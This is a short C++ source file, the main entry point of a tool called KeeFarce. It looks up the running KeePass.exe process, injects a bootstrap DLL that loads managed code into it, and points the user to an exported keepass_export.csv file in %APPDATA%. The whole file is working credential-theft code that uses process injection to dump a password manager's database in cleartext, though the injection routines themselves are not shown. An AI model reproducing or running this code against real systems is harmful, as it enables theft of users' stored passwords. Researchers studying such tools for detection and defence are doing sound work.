// KeeFarce.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <Windows.h>
#include <iostream>
#include <TlHelp32.h>
#include <stdlib.h>
#include <string>

#include "Injection.h"


using namespace std;

int main()
{

	/*
		TODO: parse command line args. Take PID or default to 'KeePass.exe'
	*/
	// Bootstrapper
	char DllName[MAX_PATH];
	GetCurrentDirectoryA(MAX_PATH, DllName);

	// KeeFarceDLL - Injected C# code
	wchar_t DllNameW[MAX_PATH];
	GetCurrentDirectory(MAX_PATH, DllNameW);
	wcscat_s(DllNameW, L"\\KeeFarceDLL.dll");

	DWORD Pid = GetProcessIdByName("KeePass.exe");
	strcat_s(DllName, "\\BootstrapDLL.dll");

	printf("[.] Injecting BootstrapDLL into %d\n", Pid);
	InjectAndRunThenUnload(Pid, DllName, "LoadManagedProject", DllNameW);

	printf("[.] Done! Check %%APPDATA%%/keepass_export.csv");

	return 0;
}

